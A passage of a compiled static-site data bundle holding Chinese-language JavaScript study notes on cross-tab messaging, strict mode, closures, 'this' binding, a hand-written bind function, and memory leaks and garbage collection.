origin = event.origin\n  if (origin !== \"http://example.org:8080\")\n    return;\n\n  // ...\n}\n\n\n",normalizedContent:"# 网页多标签通讯\n\n\n# localstorage\n\n * 必须是同域的 n 个页面\n * 如过数据不变化，则监听不到\n\n<script>\n  //a页面\n  const btn = document.getelementbyid(\"btn\");\n  btn.addeventlistener(\"click\", () => {\n    const info = {\n      name: \"yang\",\n      age: 18,\n    };\n    localstorage.setitem(\"info\", json.stringify(info));\n  });\n  //b页面\n  window.addeventlistener('storage', (event) => {\n    console.log('event :>> ', event.key);\n    console.log('object :>> ', object);\n  })\n<\/script>\n\n\n\n# websocket\n\n通过 websocket 多页面通讯，无跨域限制。\n\n\n# sharedworker\n\n暂未了解\n\n\n# iframe\n\nwindow.postmessage\n\n// 父页面向 iframe 发送消息\n// 第二个参数可以限制域名，\nwindow.iframe1.contentwindow.postmessage('hello', '*')\n\n// iframe 向父页面发送消息\nwindow.parent.postmessage('world', '*')\n\n\n> event.origin，监听域名是否合法\n\nwindow.addeventlistener(\"message\", receivemessage, false);\n\nfunction receivemessage(event)\n{\n  // for chrome, the origin property is in the event.originalevent\n  // object.\n  // 这里不准确，chrome 没有这个属性\n  // var origin = event.origin || event.originalevent.origin;\n  var origin = event.origin\n  if (origin !== \"http://example.org:8080\")\n    return;\n\n  // ...\n}\n\n\n",charsets:{cjk:!0}},{title:"JS严格模式",frontmatter:{title:"JS严格模式"},regularPath:"/webstudy/Javascript/JS%E4%B8%A5%E6%A0%BC%E6%A8%A1%E5%BC%8F.html",relativePath:"webstudy/Javascript/JS严格模式.md",key:"v-6fa45728",path:"/webstudy/Javascript/JS%E4%B8%A5%E6%A0%BC%E6%A8%A1%E5%BC%8F.html",headers:[{level:2,title:"严格模式和非严格模式的区别",slug:"严格模式和非严格模式的区别",normalizedTitle:"严格模式和非严格模式的区别",charIndex:14},{level:2,title:"设计初衷",slug:"设计初衷",normalizedTitle:"设计初衷",charIndex:104},{level:2,title:"开启严格模式",slug:"开启严格模式",normalizedTitle:"开启严格模式",charIndex:181},{level:2,title:"严格模式的不同",slug:"严格模式的不同",normalizedTitle:"严格模式的不同",charIndex:350},{level:3,title:"全局变量必须声明",slug:"全局变量必须声明",normalizedTitle:"全局变量必须声明",charIndex:32},{level:3,title:"禁止使用 with",slug:"禁止使用-with",normalizedTitle:"禁止使用 with",charIndex:44},{level:3,title:"创建 eval 作用域",slug:"创建-eval-作用域",normalizedTitle:"创建 eval 作用域",charIndex:57},{level:3,title:"禁止 this 指向全局作用域",slug:"禁止-this-指向全局作用域",normalizedTitle:"禁止 this 指向全局作用域",charIndex:72},{level:3,title:"函数参数不能重名",slug:"函数参数不能重名",normalizedTitle:"函数参数不能重名",charIndex:91}],headersStr:"严格模式和非严格模式的区别 设计初衷 开启严格模式 严格模式的不同 全局变量必须声明 禁止使用 with 创建 eval 作用域 禁止 this 指向全局作用域 函数参数不能重名",content:"# JS 严格模式\n\n\n# 严格模式和非严格模式的区别\n\n * 全局变量必须声明\n * 禁止使用 with\n * 创建 eval 作用域\n * 禁止 this 指向全局作用域\n * 函数参数不能重名\n\n\n# 设计初衷\n\nJavascript 设计之初，有很多不合理、不严谨、不安全之处，例如变量未定义即可使用 n = 100。严格模式用于规避这些问题。\n\n\n# 开启严格模式\n\n代码（或一个函数）一开始插入一行 'use strict' 即可开启严格模式\n\n'use strict' // 全局开启\n\nfunction fn() {\n    'use strict' // 某个函数开启\n\n}\n\n\n一般情况下，开发环境用 ES 或者 Typescript ，打包出的 js 代码使用严格模式\n\n\n# 严格模式的不同\n\n严格模式的细则有很多，这里总结一些常用常见的\n\n\n# 全局变量必须声明\n\n'use strict'\nn = 10 // ReferenceError: n is not defined\n\n\n\n# 禁止使用 with\n\n'use strict'\nvar obj = { x: 10 }\nwith (obj) {\n    // Uncaught SyntaxError: Strict mode code may not include a with statement\n    console.log(x)\n}\n\n\n\n# 创建 eval 作用域\n\n正常模式下，JS 只有两种变量作用域：全局作用域 + 函数作用域。严格模式下，JS 增加了 eval 作用域。\n\nchrome 隐私模式下执行这段代码？？？\n\n'use strict'\nvar x = 10\neval('var x = 20; console.log(x)')\nconsole.log(x)\n\n\n\n# 禁止 this 指向全局作用域\n\n'use strict'\nfunction fn() {\n    console.log('this', this) // undefined\n}\nfn()\n\n\n\n# 函数参数不能重名\n\n'use strict'\n\n// Uncaught SyntaxError: Duplicate parameter name not allowed in this context\nfunction fn(x, x, y) {\n    return\n}\n",normalizedContent:"# js 严格模式\n\n\n# 严格模式和非严格模式的区别\n\n * 全局变量必须声明\n * 禁止使用 with\n * 创建 eval 作用域\n * 禁止 this 指向全局作用域\n * 函数参数不能重名\n\n\n# 设计初衷\n\njavascript 设计之初，有很多不合理、不严谨、不安全之处，例如变量未定义即可使用 n = 100。严格模式用于规避这些问题。\n\n\n# 开启严格模式\n\n代码（或一个函数）一开始插入一行 'use strict' 即可开启严格模式\n\n'use strict' // 全局开启\n\nfunction fn() {\n    'use strict' // 某个函数开启\n\n}\n\n\n一般情况下，开发环境用 es 或者 typescript ，打包出的 js 代码使用严格模式\n\n\n# 严格模式的不同\n\n严格模式的细则有很多，这里总结一些常用常见的\n\n\n# 全局变量必须声明\n\n'use strict'\nn = 10 // referenceerror: n is not defined\n\n\n\n# 禁止使用 with\n\n'use strict'\nvar obj = { x: 10 }\nwith (obj) {\n    // uncaught syntaxerror: strict mode code may not include a with statement\n    console.log(x)\n}\n\n\n\n# 创建 eval 作用域\n\n正常模式下，js 只有两种变量作用域：全局作用域 + 函数作用域。严格模式下，js 增加了 eval 作用域。\n\nchrome 隐私模式下执行这段代码？？？\n\n'use strict'\nvar x = 10\neval('var x = 20; console.log(x)')\nconsole.log(x)\n\n\n\n# 禁止 this 指向全局作用域\n\n'use strict'\nfunction fn() {\n    console.log('this', this) // undefined\n}\nfn()\n\n\n\n# 函数参数不能重名\n\n'use strict'\n\n// uncaught syntaxerror: duplicate parameter name not allowed in this context\nfunction fn(x, x, y) {\n    return\n}\n",charsets:{cjk:!0}},{title:"作用域和闭包",frontmatter:{title:"作用域和闭包"},regularPath:"/webstudy/Javascript/%E4%BD%9C%E7%94%A8%E5%9F%9F%E5%92%8C%E9%97%AD%E5%8C%85.html",relativePath:"webstudy/Javascript/作用域和闭包.md",key:"v-2c8f5265",path:"/webstudy/Javascript/%E4%BD%9C%E7%94%A8%E5%9F%9F%E5%92%8C%E9%97%AD%E5%8C%85.html",headers:[{level:2,title:"作用域和自由变量",slug:"作用域和自由变量",normalizedTitle:"作用域和自由变量",charIndex:58},{level:3,title:"作用域",slug:"作用域",normalizedTitle:"作用域",charIndex:58},{level:3,title:"自由变量",slug:"自由变量",normalizedTitle:"自由变量",charIndex:62},{level:3,title:"一道题目",slug:"一道题目",normalizedTitle:"一道题目",charIndex:366},{level:2,title:"闭包（Closure）",slug:"闭包-closure",normalizedTitle:"闭包（closure）",charIndex:809},{level:3,title:"那什么是闭包？",slug:"那什么是闭包",normalizedTitle:"那什么是闭包？",charIndex:858},{level:3,title:"闭包的应用场景",slug:"闭包的应用场景",normalizedTitle:"闭包的应用场景",charIndex:1439},{level:3,title:"优点和缺点",slug:"优点和缺点",normalizedTitle:"优点和缺点",charIndex:3714},{level:3,title:"柯里化函数",slug:"柯里化函数",normalizedTitle:"柯里化函数",charIndex:3915},{level:2,title:"this",slug:"this",normalizedTitle:"this",charIndex:11},{level:3,title:"使用场景",slug:"使用场景",normalizedTitle:"使用场景",charIndex:3982},{level:3,title:"普通函数中的this",slug:"普通函数中的this",normalizedTitle:"普通函数中的this",charIndex:4063},{level:3,title:"使用call，apply，bind调用",slug:"使用call-apply-bind调用",normalizedTitle:"使用call，apply，bind调用",charIndex:4004},{level:3,title:"this作为对象，方法被调用",slug:"this作为对象-方法被调用",normalizedTitle:"this作为对象，方法被调用",charIndex:4305},{level:3,title:"class中的this",slug:"class中的this",normalizedTitle:"class中的this",charIndex:4448},{level:3,title:"箭头函数this",slug:"箭头函数this",normalizedTitle:"箭头函数this",charIndex:4492},{level:3,title:"原型链中的this",slug:"原型链中的this",normalizedTitle:"原型链中的this",charIndex:5142},{level:2,title:"手写bind函数",slug:"手写bind函数",normalizedTitle:"手写bind函数",charIndex:31}],headersStr:"作用域和自由变量 作用域 自由变量 一道题目 闭包（Closure） 那什么是闭包？ 闭包的应用场景 优点和缺点 柯里化函数 this 使用场景 普通函数中的this 使用call，apply，bind调用 this作为对象，方法被调用 class中的this 箭头函数this 原型链中的this 手写bind函数",content:"思考几个问题\n\n * this的不同应用场景如何取值？\n * 手写bind函数\n * 闭包开发中的应用场景\n\n\n# 作用域和自由变量\n\n\n# 作用域\n\n * 全局作用域\n * 函数作用域\n * 块级作用域\n\n# 块级作用域\n\nES6,块作用域由 { } 包括，if语句和for语句里面的{ }也属于块作用域\n\nif(true) {\n  let a= 100  //let、const声明的变量,只能在块作用域中被访问，和var区别\n}\nconsole.log(a) //ReferenceError: a is not defined\n\n\n\n# 自由变量\n\n * 一个变量在当前作用域没有被定义但被使用了\n * 会向上级作用域一层一层寻找，直到找到为止\n * 如果全局都没有找到，会报错xxx is not defined\n\n\n# 一道题目\n\n生成10个a标签，点击每个a标签时弹出对应index\n\nlet i, a;\n  for (i = 0; i <= 10; i++) {\n    a = document.createElement(\"a\");\n    a.innerHTML = i + \"<br>\";\n    a.addEventListener(\"click\", function (e) {\n      e.preventDefault();\n      alert(i);\n    });\n    document.body.appendChild(a);\n  }\n//很明晰这个代码是错误的，alert全部是10，为什么？\n//当为每个标签添加click时，for循环10次已经执行完了，此时i是10，alert(i)时i是全局作用域所以弹出10.\n//如何修改？\nlet a\nfor(let i = 0;....) //块级作用域，每次for循环都会形成一个新的块，1，2，3....\n\n\n\n# 闭包（Closure）\n\n作用域应用的特殊情况，函数作为参数被传递，函数作为返回值被返回\n\n\n# 那什么是闭包？\n\n * 要理解闭包，首先理解javascript特殊的变量作用域，变量的作用域无非就是两种：全局变量，局部变量。\n * javascript语言的特殊处就是函数内部可以读取外部作用域中的变量。\n * 我们有时候需要得到函数内的局部变量，但是在正常情况下，这是不能读取到的，这时候就需要用到闭包。在javascript语言中，只有函数内部的子函数才能读取局部变量，因此可以把闭包简单理解成“定义在一个函数内部的函数”。闭包是指有权访问另一个函数作用域中的变量的函数。其本质是函数的作用域链中保存着外部函数变量对象的引用。\n\n\n//函数作为返回值 \nfunction create(){\n  const a = 100\n  return function(){\n    console.log('a :>> ', a);\n  }\n}\nconst fn= create()\nconst a = 200\nfn() //100\n// 函数作为参数\nfunction print(fn){\n  const a = 200\n  fn()\n}\nconst a = 100\nfunction fn(){\n  console.log(a)\n}\nprint(fn) //100\n//自由变量的查找，是在函数定义的位置向上级作用域查找，而不是在函数执行的位置\n\n\n\n# 闭包的应用场景\n\n# 1、一个缓存的插件（封装对象的私有属性和方法）\n\n// 闭包隐藏数据，只提供 API\nfunction createCache() {\n    const num=100\n    const data = {} // 闭包中的数据，被隐藏，不被外界访问\n    return {\n        num:num,\n        set: function (key, val) {\n            data[key] = val\n        },\n        get: function (key) {\n            return data[key]\n        }\n    }\n}\n \nconst c = createCache()\nconsole.log(c.num)//num此时就作为c私有属性\nc.set('a', 100) //set此时作为c的私有方法\nconsole.log( c.get('a') )\n\n\n# 2、闭包作用回调函数\n\n * 获取数组中某一区间的数值(实际业务开发中获取某一价格区间的商品)\n\n function between(a, b) {\n    return function (v) {\n      return v >= a && v <= b;\n    };\n  }\n  const arr = [2, 5, 6, 7, 8, 3, 11, 2, 1, 8, 9];\n  const newArr = arr.filter(between(2, 6));\n  console.log(\"newArr :>> \", newArr);\n\n\n * 根据某种条件获得购物车中的商品升序 根据闭包封装，获取当前购物车内信息，根据价格或者点击次数进行排序\n\n  const product = [\n    {id: 1,name: \"a\",price: 90,click: 100,},\n    {id: 1,name: \"b\",price: 100,click: 20,},\n    {id: 1,name: \"c\",price: 160,click: 80,},\n    {id: 1,name: \"d\",price: 22,click: 45,},\n  ];\nfunction order(field) {\n  return function(a,b){\n    return a[field]-b[field]\n  }\n}\nconst OrderByPrice = product.sort(order('price')) //通过价格排序\nconsole.log('OrderByPrice :>> ', OrderByPrice);\nconst OrderByClick = product.sort(order('click'))//通过用户点击次数排序\nconsole.log('OrderByClick :>> ', OrderByClick);\n\n\n# 3、函数防抖和截流\n\n//截流\nconst throttle = (fn, wait) => {\n let preTime = Date.now()\n return function() {\n  if(Date.now() - pre > wait) {\n   fn()\n    preTime = Date.now()\n  }\n }\n}\n\n//防抖\nvar debounce = function(func, delay) {\n     var timer = null\n     return function() {\n         var that = this;\n         var args = arguments;\n          \n         if(timer) {\n             clearTimeout(timer);\n         }\n    \n         timer = setTimeout(function() {\n             func.apply(that, args);\n         }, delay)\n     }\n}\n\n\n# 4、单例模式\n\n * 保证一个类仅有一个实例，并提供一个访问它的全局访问点\n\nvar Head = (function () {\n    var HeadClass = function () { }; // 声明HeadClass对象，无法在外部直接调用\n    var instance; // 声明一个instance对象\n    return function () {\n        if (instance) { // 如果已存在 则返回instance\n            return instance;\n        }\n        instance = new HeadClass() // 如果不存在 则new一个\n        return instance;\n    }\n})();\nvar a = Head();\nvar b = new Head();\nconsole.log(a===b) // true\nvar a = HeadClass(); // 报错,HeadClass is not defined\n\n\n\n\n# 优点和缺点\n\n# 优点\n\n * 1、变量长期存在于内存中，可随时被使用\n * 2、全局变量易造成全局的变量污染，闭包通过局部变量和全局变量结合使用，通过作用域控制，可以重复使用变量，不会造成变量污染\n\n# 缺点\n\n * 由于闭包会使得函数中的变量都被保存在内存中，内存消耗很大，所以不能滥用闭包，否则会造成网页的性能问题\n * 但闭包不属于内存泄漏，预期的引用导致数据不被回收，不属于内存泄漏\n\n\n# 柯里化函数\n\n待补充\n\n\n# this\n\n一篇知乎 this的指向\n\nthis的取值是在函数执行时确认，不是定义时确认 🎉\n\n\n# 使用场景\n\n * 作为普通函数被调用\n * 使用call，apply，bind调用\n * 作为对象，方法被调用\n * class中被调用\n * 箭头函数\n\n\n# 普通函数中的this\n\n// 作为普通函数被调用\nfunction fn1(){\n  console.log(this)\n}\nfn1() //window\n\n\n\n# 使用call，apply，bind调用\n\n//使用call，apply，bind\nfn1.call({x:100}) //{x:100}\nconst fn2 = fn1.bind({x:200})\nfn2()\n\n\nbind和call的区别？请注意：调用bind过程中不会执行方法,只会返回一个方法,然后再执行\n\n\n# this作为对象，方法被调用\n\n以上wait中的this执行有什么区别呢？\n * **左图:**setTimeout中的function执行，相当于普通函数的执行，所以this指向window\n * 右图:箭头函数的本身没有自己的this，this永远取他上级作用域的this\n\n\n# class中的this\n\n- 类的方法内部如果含有this，它默认指向类的实例\n\n\n# 箭头函数this\n\n * 箭头函数的本身没有自己的this，this永远取他上级作用域的this\n\n//请看下面的对比\n//1、this作为对象的方法被调用\nlet info = {\n  name:'yang',\n  get:function(){\n    return this.name\n  }\n}\nconsole.log('info.get() :>> ', info.get()); //yang\n//2、this在闭包中的表现\nlet info = {\n  name:'yang',\n  get:function(){\n    return function(){\n      return this.name\n    }\n  }\n}\nlet a = info.get()\n//下一步当执行a时候，this指向当前函数所在的对象window，window中无name属性\nconsole.log(a()) //undefined\n//如何解决这个问题？（使用箭头函数）\nlet info = {\n  name:'yang',\n  get:function(){\n    return ()=>{ //通过箭头函数的this指向其上下文\n      console.log('this :>> ', this);\n      return this.name\n    }\n  }\n}\nlet a = info.get()\nconsole.log('a() :>> ', a());\n\n\n\n# 原型链中的this\n\nclass People {\n    constructor(name, age) {\n      this.name = name;\n      this.age = age;\n    }\n    say() {\n      console.log(`姓名${this.name},年龄${this.age}`);\n    }\n  }\n  //子类\n  class Student extends People {\n    constructor(name, age, number) {\n      super(name, age); //super会调用父类的构造函数方法\n      this.number = number;\n    }\n    sayHi() {\n      console.log(`姓名${this.name},年龄${this.age},学号${this.number}`);\n    }\n  }\n  const a = new Student(\"yang\", 18, 1);\n  a.sayHi(); //姓名yang,年龄18,学号1\n  a.__proto__.sayHi(); //姓名undefined,年龄undefined,学号undefined\n  \n  //undefined的原因，原型链中的this,相当于this指向a.__proto__这个对象，这个对象中的this.name,age都是undefined\n  //如何执行有值？修改this指向，使this指向a\n  a.__proto__.sayHi.call(a)\n\n\n\n# 手写bind函数\n\nFunction.prototype.newbind = function(){\n  const args = Array.prototype.slice.call(arguments)\n  //获取数组的第一项\n  const t = args.shift()\n  //fn.bind()中的fn \n  const self = this\n  //返回函数\n  return function(){\n    return self.apply(t,args)\n  }\n}\nfunction fn1(a,b,c){\n  console.log('this :>> ', this);\n  return 'this.is fn1'\n}\nconst fn2 = fn1.newbind({x:100},1,2,3,4)\nconst res = fn2()\nconsole.log('res :>> ', res);\n",normalizedContent:"思考几个问题\n\n * this的不同应用场景如何取值？\n * 手写bind函数\n * 闭包开发中的应用场景\n\n\n# 作用域和自由变量\n\n\n# 作用域\n\n * 全局作用域\n * 函数作用域\n * 块级作用域\n\n# 块级作用域\n\nes6,块作用域由 { } 包括，if语句和for语句里面的{ }也属于块作用域\n\nif(true) {\n  let a= 100  //let、const声明的变量,只能在块作用域中被访问，和var区别\n}\nconsole.log(a) //referenceerror: a is not defined\n\n\n\n# 自由变量\n\n * 一个变量在当前作用域没有被定义但被使用了\n * 会向上级作用域一层一层寻找，直到找到为止\n * 如果全局都没有找到，会报错xxx is not defined\n\n\n# 一道题目\n\n生成10个a标签，点击每个a标签时弹出对应index\n\nlet i, a;\n  for (i = 0; i <= 10; i++) {\n    a = document.createelement(\"a\");\n    a.innerhtml = i + \"<br>\";\n    a.addeventlistener(\"click\", function (e) {\n      e.preventdefault();\n      alert(i);\n    });\n    document.body.appendchild(a);\n  }\n//很明晰这个代码是错误的，alert全部是10，为什么？\n//当为每个标签添加click时，for循环10次已经执行完了，此时i是10，alert(i)时i是全局作用域所以弹出10.\n//如何修改？\nlet a\nfor(let i = 0;....) //块级作用域，每次for循环都会形成一个新的块，1，2，3....\n\n\n\n# 闭包（closure）\n\n作用域应用的特殊情况，函数作为参数被传递，函数作为返回值被返回\n\n\n# 那什么是闭包？\n\n * 要理解闭包，首先理解javascript特殊的变量作用域，变量的作用域无非就是两种：全局变量，局部变量。\n * javascript语言的特殊处就是函数内部可以读取外部作用域中的变量。\n * 我们有时候需要得到函数内的局部变量，但是在正常情况下，这是不能读取到的，这时候就需要用到闭包。在javascript语言中，只有函数内部的子函数才能读取局部变量，因此可以把闭包简单理解成“定义在一个函数内部的函数”。闭包是指有权访问另一个函数作用域中的变量的函数。其本质是函数的作用域链中保存着外部函数变量对象的引用。\n\n\n//函数作为返回值 \nfunction create(){\n  const a = 100\n  return function(){\n    console.log('a :>> ', a);\n  }\n}\nconst fn= create()\nconst a = 200\nfn() //100\n// 函数作为参数\nfunction print(fn){\n  const a = 200\n  fn()\n}\nconst a = 100\nfunction fn(){\n  console.log(a)\n}\nprint(fn) //100\n//自由变量的查找，是在函数定义的位置向上级作用域查找，而不是在函数执行的位置\n\n\n\n# 闭包的应用场景\n\n# 1、一个缓存的插件（封装对象的私有属性和方法）\n\n// 闭包隐藏数据，只提供 api\nfunction createcache() {\n    const num=100\n    const data = {} // 闭包中的数据，被隐藏，不被外界访问\n    return {\n        num:num,\n        set: function (key, val) {\n            data[key] = val\n        },\n        get: function (key) {\n            return data[key]\n        }\n    }\n}\n \nconst c = createcache()\nconsole.log(c.num)//num此时就作为c私有属性\nc.set('a', 100) //set此时作为c的私有方法\nconsole.log( c.get('a') )\n\n\n# 2、闭包作用回调函数\n\n * 获取数组中某一区间的数值(实际业务开发中获取某一价格区间的商品)\n\n function between(a, b) {\n    return function (v) {\n      return v >= a && v <= b;\n    };\n  }\n  const arr = [2, 5, 6, 7, 8, 3, 11, 2, 1, 8, 9];\n  const newarr = arr.filter(between(2, 6));\n  console.log(\"newarr :>> \", newarr);\n\n\n * 根据某种条件获得购物车中的商品升序 根据闭包封装，获取当前购物车内信息，根据价格或者点击次数进行排序\n\n  const product = [\n    {id: 1,name: \"a\",price: 90,click: 100,},\n    {id: 1,name: \"b\",price: 100,click: 20,},\n    {id: 1,name: \"c\",price: 160,click: 80,},\n    {id: 1,name: \"d\",price: 22,click: 45,},\n  ];\nfunction order(field) {\n  return function(a,b){\n    return a[field]-b[field]\n  }\n}\nconst orderbyprice = product.sort(order('price')) //通过价格排序\nconsole.log('orderbyprice :>> ', orderbyprice);\nconst orderbyclick = product.sort(order('click'))//通过用户点击次数排序\nconsole.log('orderbyclick :>> ', orderbyclick);\n\n\n# 3、函数防抖和截流\n\n//截流\nconst throttle = (fn, wait) => {\n let pretime = date.now()\n return function() {\n  if(date.now() - pre > wait) {\n   fn()\n    pretime = date.now()\n  }\n }\n}\n\n//防抖\nvar debounce = function(func, delay) {\n     var timer = null\n     return function() {\n         var that = this;\n         var args = arguments;\n          \n         if(timer) {\n             cleartimeout(timer);\n         }\n    \n         timer = settimeout(function() {\n             func.apply(that, args);\n         }, delay)\n     }\n}\n\n\n# 4、单例模式\n\n * 保证一个类仅有一个实例，并提供一个访问它的全局访问点\n\nvar head = (function () {\n    var headclass = function () { }; // 声明headclass对象，无法在外部直接调用\n    var instance; // 声明一个instance对象\n    return function () {\n        if (instance) { // 如果已存在 则返回instance\n            return instance;\n        }\n        instance = new headclass() // 如果不存在 则new一个\n        return instance;\n    }\n})();\nvar a = head();\nvar b = new head();\nconsole.log(a===b) // true\nvar a = headclass(); // 报错,headclass is not defined\n\n\n\n\n# 优点和缺点\n\n# 优点\n\n * 1、变量长期存在于内存中，可随时被使用\n * 2、全局变量易造成全局的变量污染，闭包通过局部变量和全局变量结合使用，通过作用域控制，可以重复使用变量，不会造成变量污染\n\n# 缺点\n\n * 由于闭包会使得函数中的变量都被保存在内存中，内存消耗很大，所以不能滥用闭包，否则会造成网页的性能问题\n * 但闭包不属于内存泄漏，预期的引用导致数据不被回收，不属于内存泄漏\n\n\n# 柯里化函数\n\n待补充\n\n\n# this\n\n一篇知乎 this的指向\n\nthis的取值是在函数执行时确认，不是定义时确认 🎉\n\n\n# 使用场景\n\n * 作为普通函数被调用\n * 使用call，apply，bind调用\n * 作为对象，方法被调用\n * class中被调用\n * 箭头函数\n\n\n# 普通函数中的this\n\n// 作为普通函数被调用\nfunction fn1(){\n  console.log(this)\n}\nfn1() //window\n\n\n\n# 使用call，apply，bind调用\n\n//使用call，apply，bind\nfn1.call({x:100}) //{x:100}\nconst fn2 = fn1.bind({x:200})\nfn2()\n\n\nbind和call的区别？请注意：调用bind过程中不会执行方法,只会返回一个方法,然后再执行\n\n\n# this作为对象，方法被调用\n\n以上wait中的this执行有什么区别呢？\n * **左图:**settimeout中的function执行，相当于普通函数的执行，所以this指向window\n * 右图:箭头函数的本身没有自己的this，this永远取他上级作用域的this\n\n\n# class中的this\n\n- 类的方法内部如果含有this，它默认指向类的实例\n\n\n# 箭头函数this\n\n * 箭头函数的本身没有自己的this，this永远取他上级作用域的this\n\n//请看下面的对比\n//1、this作为对象的方法被调用\nlet info = {\n  name:'yang',\n  get:function(){\n    return this.name\n  }\n}\nconsole.log('info.get() :>> ', info.get()); //yang\n//2、this在闭包中的表现\nlet info = {\n  name:'yang',\n  get:function(){\n    return function(){\n      return this.name\n    }\n  }\n}\nlet a = info.get()\n//下一步当执行a时候，this指向当前函数所在的对象window，window中无name属性\nconsole.log(a()) //undefined\n//如何解决这个问题？（使用箭头函数）\nlet info = {\n  name:'yang',\n  get:function(){\n    return ()=>{ //通过箭头函数的this指向其上下文\n      console.log('this :>> ', this);\n      return this.name\n    }\n  }\n}\nlet a = info.get()\nconsole.log('a() :>> ', a());\n\n\n\n# 原型链中的this\n\nclass people {\n    constructor(name, age) {\n      this.name = name;\n      this.age = age;\n    }\n    say() {\n      console.log(`姓名${this.name},年龄${this.age}`);\n    }\n  }\n  //子类\n  class student extends people {\n    constructor(name, age, number) {\n      super(name, age); //super会调用父类的构造函数方法\n      this.number = number;\n    }\n    sayhi() {\n      console.log(`姓名${this.name},年龄${this.age},学号${this.number}`);\n    }\n  }\n  const a = new student(\"yang\", 18, 1);\n  a.sayhi(); //姓名yang,年龄18,学号1\n  a.__proto__.sayhi(); //姓名undefined,年龄undefined,学号undefined\n  \n  //undefined的原因，原型链中的this,相当于this指向a.__proto__这个对象，这个对象中的this.name,age都是undefined\n  //如何执行有值？修改this指向，使this指向a\n  a.__proto__.sayhi.call(a)\n\n\n\n# 手写bind函数\n\nfunction.prototype.newbind = function(){\n  const args = array.prototype.slice.call(arguments)\n  //获取数组的第一项\n  const t = args.shift()\n  //fn.bind()中的fn \n  const self = this\n  //返回函数\n  return function(){\n    return self.apply(t,args)\n  }\n}\nfunction fn1(a,b,c){\n  console.log('this :>> ', this);\n  return 'this.is fn1'\n}\nconst fn2 = fn1.newbind({x:100},1,2,3,4)\nconst res = fn2()\nconsole.log('res :>> ', res);\n",charsets:{cjk:!0}},{title:"内存泄露和垃圾回收",frontmatter:{title:"内存泄露和垃圾回收"},regularPath:"/webstudy/Javascript/%E5%86%85%E5%AD%98%E6%B3%84%E6%BC%8F%E5%92%8C%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6.html",relativePath:"webstudy/Javascript/内存泄漏和垃圾回收.md",key:"v-741233c4",path:"/webstudy/Javascript/%E5%86%85%E5%AD%98%E6%B3%84%E6%BC%8F%E5%92%8C%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6.html",headers:[{level:2,title:"内存泄露和垃圾回收",slug:"内存泄露和垃圾回收",normalizedTitle:"内存泄露和垃圾回收",charIndex:2},{level:3,title:"内存泄漏",slug:"内存泄漏",normalizedTitle:"内存泄漏",charIndex:16},{level:3,title:"垃圾回收",slug:"垃圾回收",normalizedTitle:"垃圾回收",charIndex:7},{level:3,title:"如何检测Js内存泄漏",slug:"如何检测js内存泄漏",normalizedTitle:"如何检测js内存泄漏",charIndex:1173},{level:3,title:"一些内存泄漏的场景",slug:"一些内存泄漏的场景",normalizedTitle:"一些内存泄漏的场景",charIndex:2556}],headersStr:"内存泄露和垃圾回收 内存泄漏 垃圾回收 如何检测Js内存泄漏 一些内存泄漏的场景",content:"# 内存泄露和垃圾回收\n\n\n# 内存泄漏\n\n * 不再用到的内存，没有及时释放，就叫做内存泄漏\n * 内存泄露就是不再被需要的内存, 由于某种原因,非预期, 无法被释放\n\n\n# 垃圾回收\n\n# 原理\n\n垃圾收集器会按照固定的时间间隔或代码执行中预约的收集时间，周期性地执行如下操做——找出再也不继续使用的变量，而后释放其占用的内存\n\n# 方法\n\n * 标记清除法(新) 当变量进入环境时，就标记这个变量为进入环境,从逻辑上讲，永远不能释放进入环境的变量所占的内存，永远不能释放进入环境变量所占用的内存，只要执行流程进入相应的环境，就可能用到他们。当离开环境时，就标记为离开环境。\n\n垃圾回收器在运行的时候会给存储在内存中的变量都加上标记（所有都加），然后去掉环境变量中的变量，以及被环境变量中的变量所引用的变量（条件性去除标记），删除所有被标记的变量，删除的变量无法在环境变量中被访问所以会被删除，最后垃圾回收器，完成了内存的清除工作，并回收他们所占用的内存\n\n * 引用计数法(旧) 当声明了一个变量并将一个引用类型值赋给该变量时，则该值的引用次数就是1；若是同一个值又被赋给另外一个变量，则该值的引用次数加1；若是包含对该值引用的变量又取得了另一个值，则该值的引用次数减1。当该值的引用次数变为0时，则能够回收其占用的内存空间。当垃圾回收器下一次运行时，就会释放那些引用次数为0的值所占用的内存\n\n晕吧... 举个例子 只要有引用堆内存的地方，引用计数就要加1。如果一个值的引用次数是0，就表示这个值不再用到了，因此可以将这块内存释放。\n\nvar a =[1,2]\nvar b = a\na = null\nconsole.log(b)\n//1.[1,2]这个数组开辟了一块内存，变量a对其引用了，所以引用计数为1。\n//2.变量b也引用了这个数组，引用计数为2。\n//3.a变量回收，引用计数为1\n//4.因为引用计数不为0，所以b打印[1,2]\n\n\n * 闭包中的数据常驻内存的场景\n   注:预期的引用导致数据不被回收，严格来说闭包不属于内存泄漏，只是闭包的数据不可以被回收\n\nfunction getData(){\n  const data = {}\n  return {\n    get(key){\n      return data[key]\n    },\n    set(value){\n      data[key]=value\n    }\n  }\n}\nconst {get,set} = getData()\nset('a',100)\nget('a')\n//当set执行之后，data中的数据会存储并且不会被回收，但这也是使用此闭包的预期结果，所以说闭包不是内存泄漏，这也是为什么慎用闭包的原因，因为数据变量的常驻内存\n\n\n\n# 如何检测Js内存泄漏\n\n可使用 Chrome devTools Performance 来检测内存变化\n\n * 刷新页面，点击“GC”按钮\n * 点击“Record”按钮开始记录，然后操作页面\n * 操作结束，点击“GC”按钮，点击“结束”按钮，看分析结果\n\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>memory change</title>\n</head>\n<body>\n    <p>\n        memory change\n        <button id=\"btn1\">start</button>\n    </p>\n\n    <script>\n        const arr = []\n        for (let i = 0; i < 10 * 10000; i++) {\n            arr.push(i)\n        }\n\n        function bind() {\n            // 模拟一个比较大的数据\n            const obj = {\n                str: JSON.stringify(arr) // 简单的拷贝\n            }\n\n            window.addEventListener('resize', () => {\n                console.log(obj)\n            })\n        }\n\n        let n = 0\n        function start() {\n            setTimeout(() => {\n                bind()\n                n++\n\n                // 执行 50 次\n                if (n < 50) {\n                    start()\n                } else {\n                    alert('done')\n                }\n            }, 200)\n        }\n\n        document.getElementById('btn1').addEventListener('click', () => {\n            start()\n        })\n    <\/script>\n</body>\n</html>\n\n\n如图：\n\n- 图中的HEAP(堆)内存呈现主键升高的趋势，说明内存不断被垃圾占用，而垃圾缺得不到回收清楚。 - 